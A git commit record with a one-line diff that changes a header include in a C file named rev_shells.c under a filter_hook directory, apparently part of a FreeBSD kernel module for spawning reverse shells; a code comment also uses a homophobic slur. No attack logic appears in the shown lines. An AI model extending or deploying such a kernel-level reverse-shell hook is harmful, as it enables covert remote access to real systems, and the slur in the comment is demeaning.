bb72743360495cab7653de402646308bc16c5d44
Baremetal MSI <spark61974@gmail.com>
2025-02-13 13:13:25 -0500

    .

--- filter_hook/rev_shells.c
+++ filter_hook/rev_shells.c
@@ -26,7 +26,7 @@
 #include <sys/sched.h>    // Needed for FIRST_THREAD_IN_PROC()
 #include <sys/unistd.h> // for RFPROC
 #include <sys/imgact.h> // For image_args
-#include <machine/pcb.h> // for pcb struct
+#include <x86/pcb.h> // for pcb struct
 
 // since BSD is gay as hell and doesn't provide headers for these we declare them as external
 extern int kern_execve(struct thread *td, struct image_args *args, struct mac *mac_p,
